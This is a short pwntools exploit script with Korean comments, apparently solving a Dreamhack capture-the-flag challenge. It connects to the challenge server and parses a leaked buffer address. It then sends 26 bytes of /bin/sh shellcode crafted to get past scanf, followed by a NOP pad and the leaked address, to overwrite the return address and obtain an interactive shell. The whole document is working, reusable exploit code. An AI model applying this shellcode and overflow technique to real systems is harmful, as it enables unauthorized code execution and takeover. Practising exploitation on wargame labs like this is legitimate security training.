from pwn import *

p = remote("host3.dreamhack.games", 14089)	# 원격 서버 접속

# scanf() 우회 shellcode
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

buf = int(p.recv()[7:17], 16)	# 출력 데이터인 buf = (0xffffcfb8)에서 0xffffcfb8 (index: 7 ~ 17)만 16진수로 buf에 저장

payload = shellcode				# payload = shellcode[26]
payload += b"\x90"*106			# payload = shellcode[26] + NOP[106]
payload += p32(buf)				# payload = shellcode[26] + NOP[106] + buf_address[4]

p.sendline(payload)				# payload 입력
p.interactive()	   				# user에게 입출력을 다시 돌려줌
